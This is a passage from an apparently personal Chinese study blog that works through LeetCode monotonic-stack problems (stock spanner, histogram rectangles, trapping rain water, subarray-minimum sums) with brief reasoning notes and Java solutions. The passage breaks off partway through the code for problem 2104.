<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">StockSpanner</span> &#123;</span><br><span class="line">    Stack&lt;Integer[]&gt; stack;</span><br><span class="line">    <span class="type">int</span> index;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">StockSpanner</span><span class="params">()</span> &#123;</span><br><span class="line">        stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        stack.push(<span class="keyword">new</span> <span class="title class_">Integer</span>[]&#123;-<span class="number">1</span>, Integer.MAX_VALUE&#125;);</span><br><span class="line">        index = -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">next</span><span class="params">(<span class="type">int</span> price)</span> &#123;</span><br><span class="line">        index++;</span><br><span class="line">        <span class="keyword">while</span>(price&gt;=stack.peek()[<span class="number">1</span>])&#123;</span><br><span class="line">            stack.pop();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> index - stack.peek()[<span class="number">0</span>];</span><br><span class="line">        stack.push(<span class="keyword">new</span> <span class="title class_">Integer</span>[]&#123;index, price&#125;);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your StockSpanner object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * StockSpanner obj = new StockSpanner();</span></span><br><span class="line"><span class="comment"> * int param_1 = obj.next(price);</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>



<h3 id="1124-表现良好的最长时间段"><a href="#1124-表现良好的最长时间段" class="headerlink" title="1124. 表现良好的最长时间段"></a><a href="https://leetcode.cn/problems/longest-well-performing-interval/">1124. 表现良好的最长时间段</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这道题在前缀个题单做过了。（是因为题目特殊性，可以看成只含-1、1，然后连续，就可以前缀和加hash表做了）</span><br><span class="line">单调栈是更加广泛得做法：</span><br><span class="line">大于8小时计为1，否则为负一</span><br><span class="line">有个前缀个数组 s[i]</span><br><span class="line">需要找到满足s[i] &lt; s[j]时 j - i 的最大值 </span><br><span class="line">现在分析</span><br><span class="line">是s[i-1] &lt; s[i] 很明显这个时候肯定结果取不到s[i]</span><br><span class="line">s[i-1] &gt; s[i] 两个都有可能</span><br><span class="line">根据规律可以看出能够维护一个单调递减的单调栈。然后倒序处理结果</span><br></pre></td></tr></table></figure>

<p>跟<a href="https://leetcode.cn/problems/maximum-width-ramp/">962. 最大宽度坡</a> 很像其实</p>
<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">longestWPI</span><span class="params">(<span class="type">int</span>[] hours)</span> &#123;</span><br><span class="line">        Stack&lt;Integer[]&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">s</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> hours.length;</span><br><span class="line">        stack.push(<span class="keyword">new</span> <span class="title class_">Integer</span>[]&#123;<span class="number">0</span>, -<span class="number">1</span>&#125;);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(hours[i] &gt; <span class="number">8</span>) s++;</span><br><span class="line">            <span class="keyword">else</span> s--;</span><br><span class="line">            <span class="keyword">if</span>(!stack.empty()&amp;&amp;s &lt; stack.peek()[<span class="number">0</span>])&#123;</span><br><span class="line">                stack.push(<span class="keyword">new</span> <span class="title class_">Integer</span>[]&#123;s, i&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> n - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">while</span> (!stack.isEmpty() &amp;&amp; s &gt; stack.peek()[<span class="number">0</span>])&#123;</span><br><span class="line">                res = Integer.max(res, i - stack.peek()[<span class="number">1</span>]);</span><br><span class="line">                stack.pop();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(hours[i] &gt; <span class="number">8</span>) s--;</span><br><span class="line">            <span class="keyword">else</span> s++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1793-好子数组的最大分数"><a href="#1793-好子数组的最大分数" class="headerlink" title="1793. 好子数组的最大分数"></a><a href="https://leetcode.cn/problems/maximum-score-of-a-good-subarray/">1793. 好子数组的最大分数</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">感觉能双指针贪心啊</span><br><span class="line">证明一下，先设left = k ， right = k。设最近结果对应的为[L,R]</span><br><span class="line">如果nums[left - 1] &gt;= nums[right + ]。left就左移</span><br><span class="line">结果有四种情况 </span><br><span class="line">1、left - 1、left + 1都不包含，无所谓我一直在更新ans</span><br><span class="line">2、只包含left-1、不包含right + 1 更新无问题</span><br><span class="line">3、只包含right + 1、不包含left - 1。nums[left - 1] &gt;= nums[right + 1]，如果结果包含right + 1，那么一定包含left - 1。因为更宽了，且不影响最小值</span><br><span class="line">4、都包含 那我更新也无问题</span><br><span class="line">因此双指针一定能在某刻使得结果最佳</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maximumScore</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> nums[k];</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> k;</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> k;</span><br><span class="line">        <span class="type">int</span> <span class="variable">minVal</span> <span class="operator">=</span> nums[k];</span><br><span class="line">        <span class="keyword">while</span> (!(left == <span class="number">0</span> &amp;&amp; right == n -<span class="number">1</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(left == <span class="number">0</span>)&#123;</span><br><span class="line">                right++;</span><br><span class="line">                minVal = Integer.min(minVal, nums[right]);</span><br><span class="line">                res = Integer.max(res, minVal*(right - left + <span class="number">1</span>));</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(right == n - <span class="number">1</span>)&#123;</span><br><span class="line">                left--;</span><br><span class="line">                minVal = Integer.min(minVal, nums[left]);</span><br><span class="line">                res = Integer.max(res, minVal*(right - left + <span class="number">1</span>));</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(nums[left - <span class="number">1</span>] &lt;= nums[right + <span class="number">1</span>])&#123;</span><br><span class="line">                right++;</span><br><span class="line">                minVal = Integer.min(minVal, nums[right]);</span><br><span class="line">                res = Integer.max(res, minVal*(right - left + <span class="number">1</span>));</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                left--;</span><br><span class="line">                minVal = Integer.min(minVal, nums[left]);</span><br><span class="line">                res = Integer.max(res, minVal*(right - left + <span class="number">1</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>todo之后学学单调栈做法</p>
<h1 id="矩形面积"><a href="#矩形面积" class="headerlink" title="矩形面积"></a>矩形面积</h1><h3 id="84-柱状图中最大的矩形"><a href="#84-柱状图中最大的矩形" class="headerlink" title="84. 柱状图中最大的矩形"></a><a href="https://leetcode.cn/problems/largest-rectangle-in-histogram/">84. 柱状图中最大的矩形</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">单调栈（单调栈对我来说还是太难了。。。。。）</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">largestRectangleArea</span><span class="params">(<span class="type">int</span>[] heights)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> heights.length;</span><br><span class="line">        Deque&lt;Integer&gt; stack = <span class="keyword">new</span> <span class="title class_">ArrayDeque</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span>[] right = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> n - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">while</span> (!stack.isEmpty() &amp;&amp; heights[i] &lt;= heights[stack.peek()])&#123;</span><br><span class="line">                stack.pop();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(stack.isEmpty()) right[i] = n;</span><br><span class="line">            <span class="keyword">else</span> right[i] = stack.peek();</span><br><span class="line">            stack.push(i);</span><br><span class="line">        &#125;</span><br><span class="line">        stack.clear();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">while</span> (!stack.isEmpty() &amp;&amp; heights[i] &lt;= heights[stack.peek()])&#123;</span><br><span class="line">                stack.pop();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span>(stack.isEmpty()) left = -<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span> left = stack.peek();</span><br><span class="line">            res = Integer.max(res, heights[i] * (right[i] - left - <span class="number">1</span>));</span><br><span class="line">            stack.push(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1793-好子数组的最大分数-1"><a href="#1793-好子数组的最大分数-1" class="headerlink" title="1793. 好子数组的最大分数"></a><a href="https://leetcode.cn/problems/maximum-score-of-a-good-subarray/">1793. 好子数组的最大分数</a></h3><p>思路一</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">滑动窗口</span><br></pre></td></tr></table></figure>

<p>代码一</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maximumScore</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> nums[k];</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> k;</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> k;</span><br><span class="line">        <span class="type">int</span> <span class="variable">minVal</span> <span class="operator">=</span> nums[k];</span><br><span class="line">        <span class="keyword">while</span> (!(left == <span class="number">0</span> &amp;&amp; right == n -<span class="number">1</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(left == <span class="number">0</span>)&#123;</span><br><span class="line">                right++;</span><br><span class="line">                minVal = Integer.min(minVal, nums[right]);</span><br><span class="line">                res = Integer.max(res, minVal*(right - left + <span class="number">1</span>));</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(right == n - <span class="number">1</span>)&#123;</span><br><span class="line">                left--;</span><br><span class="line">                minVal = Integer.min(minVal, nums[left]);</span><br><span class="line">                res = Integer.max(res, minVal*(right - left + <span class="number">1</span>));</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(nums[left - <span class="number">1</span>] &lt;= nums[right + <span class="number">1</span>])&#123;</span><br><span class="line">                right++;</span><br><span class="line">                minVal = Integer.min(minVal, nums[right]);</span><br><span class="line">                res = Integer.max(res, minVal*(right - left + <span class="number">1</span>));</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                left--;</span><br><span class="line">                minVal = Integer.min(minVal, nums[left]);</span><br><span class="line">                res = Integer.max(res, minVal*(right - left + <span class="number">1</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>思路二</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">单调栈跟84特别像</span><br></pre></td></tr></table></figure>

<p>代码二（直接cv的）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maximumScore</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">int</span>[] left = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">        Deque&lt;Integer&gt; st = <span class="keyword">new</span> <span class="title class_">ArrayDeque</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> nums[i];</span><br><span class="line">            <span class="keyword">while</span> (!st.isEmpty() &amp;&amp; x &lt;= nums[st.peek()]) &#123;</span><br><span class="line">                st.pop();</span><br><span class="line">            &#125;</span><br><span class="line">            left[i] = st.isEmpty() ? -<span class="number">1</span> : st.peek();</span><br><span class="line">            st.push(i);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span>[] right = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">        st.clear();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> n - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> nums[i];</span><br><span class="line">            <span class="keyword">while</span> (!st.isEmpty() &amp;&amp; x &lt;= nums[st.peek()]) &#123;</span><br><span class="line">                st.pop();</span><br><span class="line">            &#125;</span><br><span class="line">            right[i] = st.isEmpty() ? n : st.peek();</span><br><span class="line">            st.push(i);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">ans</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> nums[i];</span><br><span class="line">            <span class="type">int</span> <span class="variable">l</span> <span class="operator">=</span> left[i];</span><br><span class="line">            <span class="type">int</span> <span class="variable">r</span> <span class="operator">=</span> right[i];</span><br><span class="line">            <span class="keyword">if</span> (l &lt; k &amp;&amp; k &lt; r) &#123; <span class="comment">// 相比 84 题多了个 if 判断</span></span><br><span class="line">                ans = Math.max(ans, h * (r - l - <span class="number">1</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="85-最大矩形"><a href="#85-最大矩形" class="headerlink" title="85. 最大矩形"></a><a href="https://leetcode.cn/problems/maximal-rectangle/">85. 最大矩形</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">前缀处理 + 柱状图中最大的矩形</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maximalRectangle</span><span class="params">(<span class="type">char</span>[][] matrix)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> matrix.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> matrix[<span class="number">0</span>].length;</span><br><span class="line">        <span class="type">int</span>[][] preSum = <span class="keyword">new</span> <span class="title class_">int</span>[m][n];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (matrix[<span class="number">0</span>][j] == <span class="string">&#x27;0&#x27;</span>) preSum[<span class="number">0</span>][j] = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">else</span> preSum[<span class="number">0</span>][j] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (matrix[i][j] == <span class="string">&#x27;0&#x27;</span>) preSum[i][j] = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">else</span> preSum[i][j] = preSum[i - <span class="number">1</span>][j] + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="type">int</span>[] right = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">            Deque&lt;Integer&gt; stack = <span class="keyword">new</span> <span class="title class_">ArrayDeque</span>&lt;&gt;();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> n - <span class="number">1</span>; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">                <span class="keyword">while</span> (!stack.isEmpty() &amp;&amp; preSum[i][j] &lt;= preSum[i][stack.peek()]) &#123;</span><br><span class="line">                    stack.pop();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (stack.isEmpty()) right[j] = n;</span><br><span class="line">                <span class="keyword">else</span> right[j] = stack.peek();</span><br><span class="line">                stack.push(j);</span><br><span class="line">            &#125;</span><br><span class="line">            stack.clear();</span><br><span class="line">            <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">while</span> (!stack.isEmpty() &amp;&amp; preSum[i][j] &lt;= preSum[i][stack.peek()]) &#123;</span><br><span class="line">                    stack.pop();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (stack.isEmpty()) left = -<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">else</span> left = stack.peek();</span><br><span class="line">                res = Integer.max(res, preSum[i][j] * (right[j] - left - <span class="number">1</span>));</span><br><span class="line">                stack.push(j);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1504-统计全-1-子矩形"><a href="#1504-统计全-1-子矩形" class="headerlink" title="1504. 统计全 1 子矩形"></a><a href="https://leetcode.cn/problems/count-submatrices-with-all-ones/">1504. 统计全 1 子矩形</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">前缀和预处理+矩形面积类似做法（固定左下方，计算个数）</span><br></pre></td></tr></table></figure>

<p>todo：先放弃，之后做</p>
<h3 id="42-接雨水"><a href="#42-接雨水" class="headerlink" title="42. 接雨水"></a><a href="https://leetcode.cn/problems/trapping-rain-water/">42. 接雨水</a></h3><p>经典题目，一般有两种做法，一种是dp，一种是单调栈。两种做法都写下</p>
<p>dp做法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">trap</span><span class="params">(<span class="type">int</span>[] height)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> height.length;</span><br><span class="line">        <span class="type">int</span>[] right = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">        <span class="type">int</span> <span class="variable">maxVal</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> n - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">          right[i] = maxVal;</span><br><span class="line">          maxVal = Integer.max(height[i], maxVal);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        maxVal = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(Integer.min(maxVal, right[i]) &gt; height[i]) res += Integer.min(maxVal, right[i]) -height[i];</span><br><span class="line">            maxVal = Integer.max(height[i], maxVal);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这种是我感觉最简单的方法</p>
<p>单调栈做法（横着算面积）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">trap</span><span class="params">(<span class="type">int</span>[] height)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        Deque&lt;Integer&gt; stack = <span class="keyword">new</span> <span class="title class_">ArrayDeque</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> height.length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">while</span> (!stack.isEmpty()&amp;&amp;height[i]&gt;=height[stack.peek()])&#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> stack.pop();</span><br><span class="line">                <span class="keyword">if</span>(stack.isEmpty()) <span class="keyword">break</span>;</span><br><span class="line">                <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> stack.peek();</span><br><span class="line">                res += (i - left - <span class="number">1</span>) * (Integer.min(height[i], height[left]) - height[mid]);</span><br><span class="line">            &#125;</span><br><span class="line">            stack.push(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>竟然还有种相向双指针方法（todo：之后理解下并学习）<a href="https://leetcode.cn/problems/trapping-rain-water/solutions/1974340/zuo-liao-nbian-huan-bu-hui-yi-ge-shi-pin-ukwm/">42. 接雨水 - 力扣（LeetCode）</a></p>
<h1 id="贡献法"><a href="#贡献法" class="headerlink" title="贡献法"></a>贡献法</h1><h3 id="907-子数组的最小值之和"><a href="#907-子数组的最小值之和" class="headerlink" title="907. 子数组的最小值之和"></a><a href="https://leetcode.cn/problems/sum-of-subarray-minimums/">907. 子数组的最小值之和</a></h3><p>思路</p>
<p><a href="https://leetcode.cn/problems/sum-of-subarray-minimums/solutions/1930857/gong-xian-fa-dan-diao-zhan-san-chong-shi-gxa5/">907. 子数组的最小值之和 - 题解</a></p>
<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">sumSubarrayMins</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">MOD_NUM</span> <span class="operator">=</span> (<span class="type">int</span>) (<span class="number">1e9</span> + <span class="number">7</span>);</span><br><span class="line">        Deque&lt;Integer&gt; stack = <span class="keyword">new</span> <span class="title class_">ArrayDeque</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">long</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> i == n ? -<span class="number">1</span> : nums[i];</span><br><span class="line">            <span class="keyword">while</span> (!stack.isEmpty()&amp;&amp; x &lt;= nums[stack.peek()])&#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> stack.pop();</span><br><span class="line">                <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> i;</span><br><span class="line">                <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span>(!stack.isEmpty())&#123;</span><br><span class="line">                    left = stack.peek();</span><br><span class="line">                &#125;</span><br><span class="line">                res += (<span class="type">long</span>) (right - index) * (index - left) * nums[index];</span><br><span class="line">            &#125;</span><br><span class="line">            stack.push(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">int</span>) (res % MOD_NUM);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里有个细节点是i得遍历到n。或者单独出去处理下stack，避免遗漏结果</p>
<h3 id="2104-子数组范围和"><a href="#2104-子数组范围和" class="headerlink" title="2104. 子数组范围和"></a><a href="https://leetcode.cn/problems/sum-of-subarray-ranges/">2104. 子数组范围和</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">贡献法，最大值增加结果，最小值减小结果</span><br><span class="line">做法跟907很像了</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">long</span> <span class="title function_">subArrayRanges</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        Deque&lt;Integer&gt; stack = <span class="keyword">new</span> <span class="title class_">ArrayDeque</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">long</span> <span class="variable">res2</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> i == n ? Integer.MIN_VALUE : nums[i];</span><br><span class="line">            <span class="keyword">while</span> (!stack.isEmpty()&amp;&amp; x &lt;= nums[stack.peek()])&#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> stack.pop();</span><br><span class="line">                <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> i;</span><br><span class="line">                <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span>(!stack.isEmpty())&#123;</span><br><span class="line">                    left = stack.peek();</span><br><span class="line">                &#125;</span><br><span class="line">                res2 += (<span class="type">long</span>) (right - index) * (index - left) * nums[index];</span><br><span class="line">            